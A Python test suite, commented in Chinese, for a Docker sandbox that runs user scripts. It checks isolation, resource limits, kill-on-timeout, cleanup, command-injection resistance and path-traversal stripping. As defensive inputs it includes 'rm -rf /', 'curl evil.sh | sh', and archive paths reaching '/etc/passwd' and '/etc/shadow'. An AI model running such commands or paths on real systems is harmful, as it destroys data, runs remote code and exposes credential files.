"""`SandboxRun` 生命周期契约测试（T019）。

这些断言是安全边界，不是普通功能测试。每条都对应 tasks.md/research.md 的一条硬约束，
**不允许为了「测试好过」而放宽实现**：

| 断言 | 来源 |
|---|---|
| 网络按执行 id 独立创建 | R-02（iptables 按接口名打标签） |
| 容器参数含 nano_cpus/mem_limit/pids_limit/read_only/tmpfs | R-01 / T024 |
| 超时后调 kill(SIGKILL) | R-06 / FR-014 |
| finally 必调 remove(force=True) 与 networks.remove() | R-01 一次性语义 |
| 异常路径也不残留 | 同上（最容易被漏掉的一条） |
| command 是常量、脚本走 put_archive | R-07（防命令注入） |
| 不接受调用方传入 docker 参数 | R-01 安全边界 |
"""

from __future__ import annotations

import pytest

from app.executors.sandbox_client import (
    CODE_DIR,
    SandboxInfraError,
    SandboxOutputLimit,
    SandboxRun,
    clamp_timeout,
    truncate_output,
)
from tests.sandbox_fixtures import make_tar_bytes


def _run(**kwargs: object) -> SandboxRun:
    params: dict[str, object] = {
        "execution_id": "exec-1",
        "language": "python",
        "code": "print('hi')",
    }
    params.update(kwargs)
    return SandboxRun(**params)  # type: ignore[arg-type]


class TestNetworkAndNaming:
    """网络与资源命名：必须按执行 id 独立，不能共用。"""

    def test_network_is_created_per_execution(self, fake_docker) -> None:
        run = _run()
        run.execute()
        # One empty reservation is replaced by the same explicit daemon IPAM.
        assert len(fake_docker.networks.created) == 2
        assert fake_docker.networks.created[0].removed == 1
        network = fake_docker.networks.created[-1]
        assert network.name == run.network_name
        assert run.network_name.endswith("exec-1")
        assert network.created_kwargs["driver"] == "bridge"

    def test_two_executions_get_distinct_networks(self, fake_docker) -> None:
        """共用网络会让并发执行互相删 iptables 规则（R-02 明确禁止）。"""
        first = SandboxRun(execution_id="exec-a", language="python", code="print(1)")
        second = SandboxRun(execution_id="exec-b", language="python", code="print(2)")
        first.execute()
        second.execute()
        names = [
            n.name for n in fake_docker.networks.created if "ipam" in n.created_kwargs
        ]
        assert len(names) == 2
        assert len(set(names)) == 2
        assert first.network_name != second.network_name

    def test_resources_are_labelled_for_reaping(self, fake_docker) -> None:
        run = _run()
        run.execute()
        for resource in (
            fake_docker.networks.created[0],
            fake_docker.volumes.created[0],
            fake_docker.container,
        ):
            labels = resource.created_kwargs.get("labels", {})
            assert labels.get("aw.execution") == "exec-1"


class TestContainerLimits:
    """容器参数必须覆盖全部资源维度，且都来自配置。"""

    def test_resource_limits_are_applied(self, fake_docker) -> None:
        from app.core.config import settings

        run = _run()
        run.execute()
        kwargs = fake_docker.container.created_kwargs

        assert kwargs["nano_cpus"] == int(settings.sbx_cpu * 1_000_000_000)
        assert kwargs["mem_limit"] == f"{settings.sbx_mem_mb}m"
        # memswap 与 mem 相同 = 禁用 swap，否则 OOM 前会先疯狂换页
        assert kwargs["memswap_limit"] == f"{settings.sbx_mem_mb}m"
        assert kwargs["pids_limit"] == settings.sbx_pids
        assert kwargs["read_only"] is True
        assert kwargs["cap_drop"] == ["ALL"]
        assert "no-new-privileges" in kwargs["security_opt"]
        assert kwargs["user"] == "10001:10001"

    def test_create_options_are_accepted_by_real_sdk(self, fake_docker) -> None:
        from docker.models.containers import _create_container_args

        run = _run()
        run.execute()
        # Fake clients accept arbitrary kwargs; exercise the real SDK boundary too.
        options = dict(fake_docker.container.created_kwargs)
        options.pop("image", None)
        options["version"] = "1.44"
        converted = _create_container_args(options)
        assert not converted["host_config"].get("AutoRemove", False)

    def test_disk_limit_uses_tmpfs_size(self, fake_docker) -> None:
        """磁盘限额只能靠 tmpfs size：实测 storage_opt 在本机不生效。"""
        from app.core.config import settings

        run = _run()
        run.execute()
        volume = fake_docker.volumes.created[1]
        assert volume.created_kwargs["driver_opts"]["type"] == "tmpfs"
        assert (
            f"size={settings.sbx_disk_mb}m" in volume.created_kwargs["driver_opts"]["o"]
        )

    def test_zero_nano_cpus_would_mean_unlimited(self, fake_docker) -> None:
        """0 在 docker 里表示「不限制」，所以换算绝不能截断成 0。"""
        run = _run()
        run.execute()
        assert fake_docker.container.created_kwargs["nano_cpus"] > 0

    def test_image_comes_from_config(self, fake_docker) -> None:
        from app.core.config import settings

        run = _run()
        run.execute()
        assert fake_docker.container.created_kwargs["image"] == settings.sbx_image

    def test_rejects_image_outside_allowlist(self, fake_docker, monkeypatch) -> None:
        """配置被改成非白名单镜像时必须拒绝启动（R-01 缓解措施 ②）。"""
        from app.core.config import settings

        monkeypatch.setattr(settings, "sbx_image", "evil/image:latest")
        run = _run()
        with pytest.raises(SandboxInfraError, match="白名单"):
            run.execute()

    def test_missing_image_is_infra_error(self, fake_docker) -> None:
        fake_docker.existing_images = set()
        run = _run()
        with pytest.raises(SandboxInfraError, match="不存在"):
            run.execute()


class TestScriptInjection:
    """R-07：脚本是文件内容，command 是常量。"""

    def test_command_is_constant_for_python(self, fake_docker) -> None:
        run = _run(language="python", code="import os; os.system('rm -rf /')")
        run.execute()
        command = fake_docker.container.created_kwargs["command"]
        # 用户代码绝不能出现在命令行里
        assert command == ["python", "-u", f"{CODE_DIR}/main.py"]
        assert not any("rm -rf" in part for part in command)

    def test_command_is_constant_for_shell(self, fake_docker) -> None:
        run = _run(language="shell", code="echo hi; curl evil.sh | sh")
        run.execute()
        command = fake_docker.container.created_kwargs["command"]
        assert command == ["bash", f"{CODE_DIR}/run.sh"]
        assert not any("curl" in part for part in command)

    def test_script_written_via_put_archive(self, fake_docker) -> None:
        run = _run(language="python", code="print('payload')")
        run.execute()
        container = fake_docker.storage
        assert len(container.put_archives) == 1
        path, data = container.put_archives[0]
        assert path == CODE_DIR
        assert b"print('payload')" in data

    def test_shell_script_uses_run_sh(self, fake_docker) -> None:
        run = _run(language="shell", code="echo hi")
        run.execute()
        _path, data = fake_docker.storage.put_archives[0]
        assert b"run.sh" in data

    def test_unsupported_language_rejected(self) -> None:
        with pytest.raises(ValueError, match="不支持"):
            SandboxRun(execution_id="e", language="ruby", code="puts 1")  # type: ignore[arg-type]

    def test_empty_code_rejected(self) -> None:
        # 纯空白也拒绝：空脚本跑一次等于白烧一次配额
        with pytest.raises(ValueError, match="脚本内容为空"):
            SandboxRun(execution_id="e", language="python", code="   ")


class TestOutputVolumes:
    """脚本卷与产物卷必须分开，且产物卷要能跨容器退出存活。"""

    def test_output_dir_is_a_volume(self, fake_docker) -> None:
        """tmpfs 上的产物会随容器退出卸载（实测），所以 output 必须挂卷。"""
        run = _run()
        run.execute()
        volumes = fake_docker.container.created_kwargs["volumes"]
        assert f"{run.output_volume_name}:/workspace:rw" in volumes
        assert f"{run.output_volume_name}:/tmp:rw" in volumes

    def test_code_dir_is_a_volume(self, fake_docker) -> None:
        """read_only=True 时 daemon 拒绝 put_archive 到 rootfs，只能写卷。"""
        run = _run()
        run.execute()
        volumes = fake_docker.container.created_kwargs["volumes"]
        assert f"{run.code_volume_name}:{CODE_DIR}:ro" in volumes

    def test_two_volumes_created_and_cleaned(self, fake_docker) -> None:
        run = _run()
        run.execute()
        assert len(fake_docker.volumes.created) == 2
        run.cleanup()
        assert all(v.removed == 1 for v in fake_docker.volumes.created)


class TestWaitLoop:
    """分段等待与超时终止（R-06 / FR-014）。"""

    def test_polls_with_short_timeout(self, fake_docker) -> None:
        fake_docker.remaining_polls = 2
        run = _run(timeout_s=60)
        outcome = run.execute()
        # 前两次轮询超时，第三次拿到结果
        assert len(fake_docker.container.wait_calls) == 3
        assert all(
            call is not None and call <= 1.0
            for call in fake_docker.container.wait_calls
        )
        assert outcome.timed_out is False

    def test_timeout_kills_with_sigkill(self, fake_docker, advancing_clock) -> None:
        """超时必须 SIGKILL：脚本能在 SIGTERM 里挂 handler 赖着不走。"""
        fake_docker.wait_raises_timeout = 10_000  # 永远超时，靠时钟推进到 deadline
        run = _run(timeout_s=3)
        outcome = run.execute()
        assert outcome.timed_out is True
        assert fake_docker.container.killed == ["SIGKILL"]
        assert outcome.exit_code == 137

    def test_abort_check_kills_container(self, fake_docker) -> None:
        """取消必须立即生效，而不是等到超时。"""
        calls = {"n": 0}

        def abort() -> bool:
            calls["n"] += 1
            return calls["n"] > 1

        fake_docker.remaining_polls = 100
        run = _run(timeout_s=60, abort_check=abort)
        outcome = run.execute()
        assert outcome.cancelled is True
        assert outcome.timed_out is False
        assert fake_docker.container.killed == ["SIGKILL"]

    def test_abort_check_checked_before_wait(self, fake_docker) -> None:
        """已经在取消状态下，不应再发起一次 1s 的轮询等待。"""
        run = _run(timeout_s=60, abort_check=lambda: True)
        outcome = run.execute()
        assert outcome.cancelled is True
        # 唯一允许的 wait 是杀完之后取退出码那次（timeout=10），
        # 不能出现任何 1s 级别的轮询
        assert all(
            call is None or call > 1.0 for call in fake_docker.container.wait_calls
        )

    def test_normal_exit_has_no_kill(self, fake_docker) -> None:
        fake_docker.exit_code = 0
        run = _run()
        outcome = run.execute()
        assert fake_docker.container.killed == []
        assert outcome.exit_code == 0
        assert outcome.timed_out is False
        assert outcome.cancelled is False


class TestOutcomeFields:
    """退出码、OOM 标记、资源采样、截断元数据。"""

    def test_oom_flag_comes_from_daemon(self, fake_docker) -> None:
        """OOMKilled 比「退出码 137」可靠：137 也可能是被我们杀的。"""
        fake_docker.exit_code = 137
        fake_docker.oom_killed = True
        run = _run()
        outcome = run.execute()
        assert outcome.oom_killed is True
        assert outcome.exit_code == 137

    def test_exit_state_is_reloaded_after_wait(self, fake_docker) -> None:
        fake_docker.exit_code = 137
        create = fake_docker.containers.create

        def create_with_stale_state(image: str, **kwargs):
            container = create(image, **kwargs)
            container.reload = lambda: container.attrs["State"].update(OOMKilled=True)
            return container

        fake_docker.containers.create = create_with_stale_state
        assert _run().execute().oom_killed is True

    def test_nonzero_exit_code_preserved(self, fake_docker) -> None:
        fake_docker.exit_code = 2
        outcome = _run().execute()
        assert outcome.exit_code == 2

    def test_stdout_and_stderr_are_separate(self, fake_docker) -> None:
        """stdout 与 stderr 必须分列采集：合并后界面无法分栏，也分不清报错来源。"""
        fake_docker.exit_code = 0
        original_create = fake_docker.containers.create

        def create_with_output(image: str, **kwargs):
            container = original_create(image, **kwargs)
            container.stdout = b"out-line\n"
            container.stderr = b"err-line\n"
            return container

        fake_docker.containers.create = create_with_output  # type: ignore[method-assign]
        outcome = _run().execute()
        assert outcome.stdout == b"out-line\n"
        assert outcome.stderr == b"err-line\n"

    def test_output_is_truncated_to_configured_limit(self, fake_docker) -> None:
        from app.core.config import settings

        fake_docker.exit_code = 0
        limit = settings.sbx_stdout_max_bytes
        original_create = fake_docker.containers.create

        def create_with_big_output(image: str, **kwargs):
            container = original_create(image, **kwargs)
            container.stdout = b"A" * (limit + 100) + b"TAIL"
            container.stderr = b""
            return container

        fake_docker.containers.create = create_with_big_output  # type: ignore[method-assign]
        outcome = _run().execute()
        assert len(outcome.stdout) == limit
        assert outcome.stdout.endswith(b"TAIL")
        assert outcome.stdout_truncated is True
        assert outcome.stdout_full_bytes == limit + 104

    def test_resource_peaks_sampled(self, fake_docker) -> None:
        """cpu_ms 从纳秒换算（÷1e6），内存峰值优先读 cgroup v2 的 `peak`。"""
        original_create = fake_docker.containers.create

        def create_with_stats(image: str, **kwargs):
            container = original_create(image, **kwargs)
            container.stats_data = {
                "cpu_stats": {"cpu_usage": {"total_usage": 2_500_000_000}},
                "memory_stats": {"peak": 123_456_789},
            }
            return container

        fake_docker.containers.create = create_with_stats  # type: ignore[method-assign]
        outcome = _run().execute()
        assert outcome.cpu_ms == 2500
        assert outcome.mem_peak_bytes == 123_456_789

    def test_memory_peak_falls_back_to_v1_max_usage(self, fake_docker) -> None:
        """cgroup v1 只有 `max_usage`，也要能读出来。"""
        original_create = fake_docker.containers.create

        def create_with_v1_stats(image: str, **kwargs):
            container = original_create(image, **kwargs)
            container.stats_data = {
                "cpu_stats": {"cpu_usage": {"total_usage": 1_000_000}},
                "memory_stats": {"max_usage": 9_000_000},
            }
            return container

        fake_docker.containers.create = create_with_v1_stats  # type: ignore[method-assign]
        outcome = _run().execute()
        assert outcome.cpu_ms == 1
        assert outcome.mem_peak_bytes == 9_000_000

    def test_stats_failure_yields_none_not_zero(self, fake_docker) -> None:
        """读不到资源要置 NULL，不能编造 0（否则监控看不出「没测到」）。"""
        from docker.errors import APIError

        run = _run()
        # 先让容器创建出来，再注入故障
        fake_docker.exit_code = 0
        original_create = fake_docker.containers.create

        def create_and_break(image: str, **kwargs):
            container = original_create(image, **kwargs)
            container.stats_raises = APIError("stats unavailable")
            return container

        fake_docker.containers.create = create_and_break  # type: ignore[method-assign]
        outcome = run.execute()
        assert outcome.cpu_ms is None
        assert outcome.mem_peak_bytes is None


class TestCleanup:
    """销毁必须无条件执行，且顺序正确（先容器，再卷，最后网络）。"""

    def test_cleanup_removes_everything(self, fake_docker) -> None:
        run = _run()
        run.execute()
        run.cleanup()
        assert fake_docker.container.removed == [True]
        assert all(v.removed == 1 for v in fake_docker.volumes.created)
        assert fake_docker.network.removed == 1

    def test_cleanup_runs_on_exception(self, fake_docker) -> None:
        """异常路径也不能残留——这是最容易被漏掉的一条。"""
        fake_docker.exit_code = 0
        run = SandboxRun(execution_id="exec-err", language="python", code="print(1)")
        with pytest.raises(RuntimeError, match="boom"), run:
            # 资源已经真实建出来了，然后上层逻辑炸掉
            run.execute()
            raise RuntimeError("boom")
        assert fake_docker.container.removed == [True]
        assert fake_docker.network.removed == 1
        assert all(v.removed == 1 for v in fake_docker.volumes.created)

    def test_cleanup_is_idempotent(self, fake_docker) -> None:
        run = _run()
        run.execute()
        run.cleanup()
        run.cleanup()
        # 第二次不应重复 remove（已置 None）
        assert fake_docker.container.removed == [True]

    def test_cleanup_continues_after_container_failure(self, fake_docker) -> None:
        """容器删除失败不能连带跳过卷和网络清理，否则会留孤儿资源。"""
        from docker.errors import APIError

        run = _run()
        run.execute()

        def boom(force: bool = False) -> None:
            raise APIError("cannot remove")

        fake_docker.container.remove = boom  # type: ignore[method-assign]
        run.cleanup()
        assert all(v.removed == 1 for v in fake_docker.volumes.created)
        assert fake_docker.network.removed == 1

    def test_single_use(self, fake_docker) -> None:
        run = _run()
        run.execute()
        with pytest.raises(RuntimeError, match="只能执行一次"):
            run.execute()


class TestOutputCollection:
    """产物回收：流式、限额、路径清洗。"""

    def _executed(self, fake_docker) -> SandboxRun:
        fake_docker.exit_code = 0
        run = _run()
        run.execute()
        return run

    def test_reads_files_from_output(self, fake_docker) -> None:
        run = self._executed(fake_docker)
        fake_docker.storage.archived = make_tar_bytes(
            {"output/a.txt": b"hello", "output/sub/b.txt": b"world"}
        )
        files = {f.name: f.data for f in run.iter_output_files()}
        assert files == {"a.txt": b"hello", "sub/b.txt": b"world"}

    def test_missing_output_dir_is_not_an_error(self, fake_docker) -> None:
        """脚本没产出任何文件是正常情况，不该报错。"""
        run = self._executed(fake_docker)
        fake_docker.storage.archive_missing = True
        assert list(run.iter_output_files()) == []

    def test_skips_directories(self, fake_docker) -> None:
        run = self._executed(fake_docker)
        fake_docker.storage.archived = make_tar_bytes({"output/only.txt": b"x"})
        assert [f.name for f in run.iter_output_files()] == ["only.txt"]

    def test_file_count_limit(self, fake_docker) -> None:
        run = self._executed(fake_docker)
        fake_docker.storage.archived = make_tar_bytes(
            {f"output/f{i}.txt": b"x" for i in range(5)}
        )
        with pytest.raises(SandboxOutputLimit) as exc:
            list(run.iter_output_files(max_files=3))
        assert exc.value.reason == "files"

    def test_single_file_size_limit(self, fake_docker) -> None:
        run = self._executed(fake_docker)
        fake_docker.storage.archived = make_tar_bytes({"output/big.bin": b"x" * 2048})
        with pytest.raises(SandboxOutputLimit) as exc:
            list(run.iter_output_files(max_file_bytes=1024))
        assert exc.value.reason == "file_size"

    def test_total_size_limit(self, fake_docker) -> None:
        run = self._executed(fake_docker)
        fake_docker.storage.archived = make_tar_bytes(
            {"output/a.bin": b"x" * 800, "output/b.bin": b"y" * 800}
        )
        with pytest.raises(SandboxOutputLimit) as exc:
            list(run.iter_output_files(max_total_bytes=1000))
        assert exc.value.reason == "total_size"

    def test_path_traversal_is_stripped(self, fake_docker) -> None:
        """脚本能创建任意文件名，不能让它逃出 output/ 前缀。

        两种形态都要测：**前导** `..`（会被 lstrip 顺手吃掉，是假阳性陷阱）
        和**中间** `..`（只有真正逐段过滤才拦得住）。
        """
        run = self._executed(fake_docker)
        fake_docker.storage.archived = make_tar_bytes(
            {
                "output/../../etc/passwd": b"root",
                "output/./ok.txt": b"ok",
                # 中间段逃逸：lstrip 吃不掉，必须靠逐段过滤
                "output/a/../../../etc/shadow": b"shadow",
                "output/sub/../inner.txt": b"inner",
            }
        )
        names = [f.name for f in run.iter_output_files()]
        assert all(".." not in n for n in names), names
        assert all(not n.startswith("/") for n in names), names
        assert "a/etc/shadow" in names
        # 注意：实现是「丢弃 .. 段」而非「按路径归约」，所以
        # a/../../../etc/shadow 会变成 a/etc/shadow 而不是 etc/shadow。
        # 丢弃是更保守的策略——结果永远不会逃出 output/ 前缀。
        assert "sub/inner.txt" in names

    def test_relative_name_rejects_traversal_segments(self) -> None:
        """直接打纯函数：逐段**丢弃** `..`，不依赖 lstrip 的副作用。

        断言的是实现的真实语义（丢弃而非归约）。关键不变量只有一条：
        结果里绝不能残留 `..` 或绝对路径开头。
        """
        from app.executors.sandbox_client import SandboxRun

        cases = {
            "output/../../etc/passwd": "etc/passwd",
            "output/a/../../../etc/shadow": "a/etc/shadow",
            "output/sub/../inner.txt": "sub/inner.txt",
            "output/./ok.txt": "ok.txt",
            "output/normal.txt": "normal.txt",
            "output/sub/dir/deep.txt": "sub/dir/deep.txt",
        }
        for raw, expected in cases.items():
            assert SandboxRun._relative_name(raw) == expected, raw

        # 不变量：任何形态都不产生逃逸路径
        for raw in cases:
            result = SandboxRun._relative_name(raw)
            assert ".." not in result.split("/"), raw
            assert not result.startswith("/"), raw

    def test_requires_execution_first(self, fake_docker) -> None:
        run = _run()
        with pytest.raises(RuntimeError, match="尚未执行"):
            list(run.iter_output_files())


class TestHelpers:
    """纯函数：截断与超时夹取。"""

    @pytest.mark.parametrize(
        ("data", "limit", "expected_len", "truncated"),
        [
            (b"short", 10, 5, False),
            (b"0123456789", 10, 10, False),
            (b"0123456789", 4, 4, True),
            (b"0123456789", 0, 10, False),
        ],
    )
    def test_truncate_output(self, data, limit, expected_len, truncated) -> None:
        result, was_truncated, full = truncate_output(data, limit)
        assert len(result) == expected_len
        assert was_truncated is truncated
        assert full == len(data)

    def test_truncate_keeps_tail(self) -> None:
        """保留尾部：traceback 在最后，截头部等于丢掉最有用的部分。"""
        result, _, _ = truncate_output(b"HEAD" + b"x" * 100 + b"TAIL", 4)
        assert result == b"TAIL"

    def test_clamp_timeout_bounds(self) -> None:
        from app.core.config import settings

        assert clamp_timeout(None) == settings.sbx_timeout_default
        assert clamp_timeout(0) == 1
        assert clamp_timeout(-5) == 1
        assert clamp_timeout(10**9) == settings.sbx_timeout_max
        assert clamp_timeout(30) == 30
